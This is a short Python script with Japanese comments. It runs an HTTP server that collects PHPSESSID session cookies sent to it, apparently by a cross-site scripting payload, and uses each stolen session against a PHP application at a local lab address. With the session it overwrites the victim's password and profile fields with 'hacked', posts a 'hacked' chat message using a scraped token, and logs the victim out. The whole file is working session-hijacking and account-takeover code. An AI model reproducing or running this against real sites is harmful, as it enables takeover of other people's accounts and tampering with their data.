from socketserver import ThreadingTCPServer
from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import requests
import json

address = ('0.0.0.0', 80) # listenするipとportの設定
host = 'http://192.168.56.101/' # listenするhost

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path) # urlの解析
        cookies = parse_qs(parsed_path.query) # urlのクエリの抽出
        cookies = dict(PHPSESSID=cookies['PHPSESSID'][0]) # urlのクエリからPHPSESSIDの抽出

        # レスポンスの返信
        self.send_response(200)
        self.send_header('Content-Type','text/plain; charset=utf-8')
        self.end_headers()

        res = requests.post(f'{host}/php/index.php', cookies=cookies) # ユーザの特定
        if res.status_code == 200:
            name = json.loads(res.content)['auth']['name'] # 名前の抽出

            payloads = ['password', 'disp_name', 'address', 'phone', 'email'] # profileの一覧
            headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'} # メディアタイプの指定

            for payload in payloads:
                payload += f'=hacked&name={name}' # パラメータの定義
                res = requests.post(f'{host}/php/profile_update.php', cookies=cookies, params=payload, headers=headers) # profileの変更
                print(payload, res.status_code) # 正常に行われたか確認

            res = requests.post(f'{host}/php/chat.php', cookies=cookies, json={'func':'conf'}) # /php/chatとの通信の開始
            if res.status_code == 200:
                token = json.loads(res.content)['result']['token'] # tokenの抽出
                send_data = {'comment':'hacked', 'func':'add', 'image':None, 'sid':'1', 'student':name, 'token':token} # チャットの送信データの定義
                res = requests.post(f'{host}/php/chat.php', cookies=cookies, json=send_data) # チャットの送信
                print(f'/php/chat.php: {res.status_code}') # 正常に行われたか確認

            # logoutする(PHPSEDDIDが破棄される)
            res = requests.post(f'{host}/php/logout.php', cookies=cookies)
            print(f'/php/logout.php: {res.status_code}') # 正常に行われたか確認
        else:
            print(f'error /php/index.php: {res.status_code}')

ThreadingTCPServer.allow_reuse_address = True

with ThreadingTCPServer(address, MyHTTPRequestHandler) as server:
    server.serve_forever()
